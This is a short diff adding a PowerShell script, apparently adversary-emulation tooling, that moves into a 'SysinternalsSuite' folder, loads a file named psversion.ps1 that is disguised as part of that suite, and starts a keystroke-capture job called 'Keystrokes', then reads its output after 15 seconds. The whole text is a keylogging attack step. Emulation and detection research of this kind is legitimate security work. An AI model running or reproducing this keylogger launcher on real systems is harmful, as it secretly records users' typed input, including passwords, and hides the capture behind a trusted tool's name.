@@ -1,0 +1,9 @@
+if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+  write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+  exit 1;
+}
+Set-Location -path "C:\Program Files\SysinternalsSuite";
+. .\psversion.ps1;
+Get-Keystrokes;
+Start-Sleep -Seconds 15;
+View-Job -JobName "Keystrokes";
